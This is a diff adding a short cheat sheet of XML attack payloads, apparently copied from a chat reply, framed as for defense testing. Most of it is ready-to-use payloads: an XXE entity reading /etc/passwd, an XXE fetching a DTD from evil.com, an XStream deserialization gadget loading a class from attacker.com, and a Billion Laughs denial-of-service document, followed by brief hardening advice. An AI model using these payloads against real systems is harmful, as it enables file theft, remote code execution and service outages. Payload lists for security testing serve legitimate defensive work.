@@ -1,0 +1,81 @@
+🔒 Common XML Attack Payloads (For Defense Testing Only)
+1. XXE – External Entity + File Disclosure (Can Lead to RCE if Combined)
+xml
+Copy
+Edit
+<?xml version="1.0" ?>
+<!DOCTYPE data [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<data>&xxe;</data>
+Use Case (Defense): Test if the application is parsing XML with DTDs enabled. RCE can happen if the system processes remote resources or interprets dangerous file content.
+
+2. XXE with Remote Resource (Potential SSRF/RCE Vector)
+xml
+Copy
+Edit
+<?xml version="1.0" ?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">
+]>
+<foo>&xxe;</foo>
+Use Case: Test if the parser fetches remote entities. If the DTD contains further payloads (like Java deserialization), RCE is possible.
+
+3. Java Deserialization RCE (XML-based)
+If the app is using a vulnerable XML parser like XStream, you can inject objects.
+
+xml
+Copy
+Edit
+<map>
+  <entry>
+    <jdk.nashorn.internal.objects.NativeString>
+      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
+        <dataHandler>
+          <dataSource class="javax.activation.URLDataSource">
+            <url>http://attacker.com/Exploit.class</url>
+          </dataSource>
+        </dataHandler>
+        <dataLen>0</dataLen>
+      </value>
+    </jdk.nashorn.internal.objects.NativeString>
+    <string>test</string>
+  </entry>
+</map>
+⚠️ Works only if XStream or similar libraries are misconfigured and allow arbitrary object deserialization.
+
+4. Billion Laughs Attack (Denial of Service)
+This is not RCE but can be used as a prelude to assess parser robustness.
+
+xml
+Copy
+Edit
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+ <!ENTITY lol "lol">
+ <!ENTITY lol1 "&lol;&lol;">
+ <!ENTITY lol2 "&lol1;&lol1;">
+ <!ENTITY lol3 "&lol2;&lol2;">
+ <!ENTITY lol4 "&lol3;&lol3;">
+ <!ENTITY lol5 "&lol4;&lol4;">
+ <!ENTITY lol6 "&lol5;&lol5;">
+ <!ENTITY lol7 "&lol6;&lol6;">
+ <!ENTITY lol8 "&lol7;&lol7;">
+ <!ENTITY lol9 "&lol8;&lol8;">
+]>
+<lolz>&lol9;</lolz>
+🛡️ Defensive Recommendations
+Disable DTD processing in your XML parsers.
+
+Use secure XML libraries:
+
+Java: javax.xml.XMLConstants.FEATURE_SECURE_PROCESSING
+
+Python: use defusedxml
+
+Disable deserialization of untrusted data.
+
+Add WAF rules to detect XXE and serialized objects.
+
+Use dependency checking tools (like OWASP Dependency-Check) to find vulnerable XML processors.
+
